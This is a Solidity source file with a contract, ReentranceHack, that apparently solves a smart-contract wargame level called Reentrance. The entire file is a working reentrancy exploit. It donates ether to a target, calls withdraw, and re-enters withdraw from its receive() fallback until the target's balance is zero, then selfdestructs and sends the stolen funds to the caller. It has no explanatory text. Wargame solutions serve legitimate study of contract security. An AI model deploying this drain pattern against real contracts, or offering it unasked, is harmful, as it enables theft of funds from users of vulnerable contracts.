// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceHack {
    IReentrance public immutable reentrance;

    constructor(address _reentrance) {
        reentrance = IReentrance(_reentrance);
    }

    function attack() external payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
        
        require(address(reentrance).balance == 0, "ReentranceHack: failed");
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint amount = min(msg.value, address(reentrance).balance);
        if (amount > 0) {
            reentrance.withdraw(amount);
        }
    }

    function min(uint a, uint b) internal pure returns (uint) {
        return a <= b ? a : b;
    }
}